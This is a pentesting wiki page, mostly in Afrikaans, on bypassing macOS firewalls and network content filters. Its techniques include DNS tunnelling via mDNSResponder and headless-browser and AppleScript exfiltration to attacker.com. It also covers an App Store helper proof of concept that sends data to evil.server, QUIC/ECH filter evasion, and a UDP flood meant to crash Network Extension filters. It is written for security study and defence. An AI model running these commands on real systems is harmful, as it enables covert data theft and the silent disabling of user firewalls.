# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Gevonde tegnieke

Die volgende tegnieke is gevind wat in sommige macOS-firewall-apps werk.

### Misbruik van whitelist-name

- Byvoorbeeld, deur die malware te roep met name van bekende macOS-prosesse soos **`launchd`**

### Synthetic Click

- As die firewall die gebruiker se toestemming vra, laat die malware **op allow klik**

### **Gebruik Apple-ondertekende binaries**

- Soos **`curl`**, maar ook ander soos **`whois`**

### Bekende Apple-domeine

Die firewall kan verbindings na bekende Apple-domeine soos **`apple.com`** of **`icloud.com`** toelaat. En iCloud kan as ’n C2 gebruik word.

### Generiese Bypass

Enkele idees om firewalls te probeer bypass

### Kontroleer toegelate verkeer

Om te weet watter verkeer toegelaat word, sal jou help om potensieel gewhitelistde domeine te identifiseer, of te bepaal watter toepassings toegelaat word om toegang daartoe te verkry
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Misbruik van DNS

Op macOS praat ’n proses **nie** self met die DNS-bediener nie. Naamresolusie word oor **XPC** deur **`mDNSResponder`** (`/usr/sbin/mDNSResponder`) bemiddel, ’n Apple-ondertekende stelsel-daemon. Elke lookup op die masjien verlaat dus die host as verkeer **van `mDNSResponder`** eerder as van die proses wat dit versoek het. Firewalls is daarom geneig om daardie daemon onvoorwaardelik te vertrou — om dit te weier, sou naamresolusie vir die hele stelsel breek.<sup>[[1]](#references)</sup>

Dit maak DNS ’n kanaal wat oop bly selfs wanneer die firewall die malware se eie sockets blokkeer:<sup>[[1]](#references)</sup>

1. Die malware probeer aan `evil.com` koppel. Die firewall ondersoek sy **eie** uitgaande verbinding en **blokkeer** dit.
2. Die malware vra eerder vir `mDNSResponder` om `evil.com` oor XPC te **resolve**.
3. Die firewall ondersoek die gevolglike navraag, sien die vertroude Apple-ondertekende resolver as die oorsprong, en **laat dit toe**.
4. Die navraag bereik die DNS-bediener — en as die aanvaller die authoritative server vir `evil.com` bestuur, beheer hulle albei kante van die uitruiling.

Omdat die aanvaller daardie zone besit, is geen "verbinding" ooit nodig nie: data word binne die **navraag-etikette** uitgesmokkel (byvoorbeeld `<encoded-chunk>.evil.com`), en commands kom terug binne die **antwoordrekords** (TXT, A, CNAME…), wat klassieke DNS tunnelling is wat op ’n volledig gewhitelistde proses ry.

Enige onbevoorregte proses kan die daemon direk aandryf, wat ’n maklike manier is om te bevestig dat die pad oop is:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Via Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

As jy code in 'n process kan inject wat toegelaat word om aan enige server te connect, kan jy die firewall protections bypass:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Onlangse macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
In Julie 2024 het Apple 'n kritieke bug in Safari/WebKit gepatch wat die stelselwye “Web content filter” wat deur Screen Time-ouerkontroles gebruik word, gebreek het.
'n Spesiaal vervaardigde URI (byvoorbeeld met dubbel URL-geënkodeerde “://”) word nie deur die Screen Time ACL herken nie, maar word wel deur WebKit aanvaar, sodat die request ongefilterd uitgestuur word. Enige process wat 'n URL kan open (insluitend sandboxed of unsigned code) kan dus domeine bereik wat uitdruklik deur die gebruiker of 'n MDM-profiel geblokkeer word.<sup>[[2]](#references)</sup>

Praktiese toets (ongepatchte system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF)-reëlvolgorde-fout in vroeë macOS 14 “Sonoma”
Tydens die macOS 14-beta-siklus het Apple ’n regressie in die userspace-wrapper rondom **`pfctl`** bekendgestel.
Reëls wat met die `quick`-sleutelwoord bygevoeg is (wat deur baie VPN kill-switches gebruik word), is stilweg geïgnoreer, wat traffic leaks veroorsaak het selfs wanneer ’n VPN/firewall-GUI *blocked* gerapporteer het. Die fout is deur verskeie VPN-verskaffers bevestig en in RC 2 (build 23A344) reggestel.<sup>[[6]](#references)</sup>

Vinnige leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Misbruik van Apple-ondertekende helper-dienste (legacy – pre-macOS 11.2)
Voor macOS 11.2 het die **`ContentFilterExclusionList`** ongeveer 50 Apple-binaries, soos **`nsurlsessiond`** en die App Store, toegelaat om alle socket-filter-firewalls wat met die Network Extension-framework geïmplementeer is (LuLu, Little Snitch, ens.), te omseil.
Malware kon eenvoudig ’n uitgeslote proses spawn—of code daarin injecteer—en sy eie verkeer oor die reeds toegelate socket tonnel. Apple het die exclusion list in macOS 11.2 heeltemal verwyder, maar die tegniek is steeds relevant op stelsels wat nie opgegradeer kan word nie.<sup>[[3]](#references)</sup>

Voorbeeld van ’n proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH om Network Extension-domeinfilters te omseil (macOS 12+)
NEFilter Packet/Data Providers baseer hul werking op die TLS ClientHello SNI/ALPN. Met **HTTP/3 over QUIC (UDP/443)** en **Encrypted Client Hello (ECH)** bly die SNI encrypted, kan NetExt nie die flow parseer nie, en hostname-reëls fail-open dikwels, wat malware toegang tot geblokkeerde domeine gee sonder om aan DNS te raak.<sup>[[5]](#references)</sup>

Minimale PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
As QUIC/ECH steeds geaktiveer is, is dit ’n maklike hostname-filter-ontduikingspad.

### macOS 15 “Sequoia” Network Extension-onstabiliteit (2024–2025)
Vroeë 15.0/15.1-builds laat derdeparty-**Network Extension**-filters (LuLu, Little Snitch, Defender, SentinelOne, ens.) crash. Wanneer die filter herbegin, verwyder macOS sy flow-reëls en baie produkte faal-oop. Deur die filter met duisende kort UDP-flows te flood (of QUIC/ECH af te dwing), kan die crash herhaaldelik veroorsaak word en ’n venster vir C2/exfil gelaat word terwyl die GUI steeds beweer dat die firewall loop.<sup>[[4]](#references)</sup>

Vinnige reproduksie (veilige labmasjien):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Wenke vir tooling op moderne macOS

1. Inspekteer huidige PF-reëls wat GUI-firewalls genereer:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Lys binaries wat reeds die *outgoing-network*-entitlement het (nuttig vir piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registreer programmaties jou eie Network Extension-content filter in Objective-C/Swift.
’n Minimale rootless PoC wat pakkette na ’n plaaslike socket aanstuur, is beskikbaar in Patrick Wardle se **LuLu**-source code.

## Verwysings

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [macOS 14 Sonoma firewall bug fixed! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
